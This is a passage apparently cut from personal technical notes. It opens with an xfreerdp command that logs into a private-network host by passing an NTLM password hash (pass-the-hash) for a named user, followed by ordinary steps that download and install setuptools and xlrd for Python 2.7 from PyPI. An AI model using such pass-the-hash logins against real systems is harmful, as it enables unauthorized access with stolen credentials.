xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
# Python2.7安裝
```shell
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install
```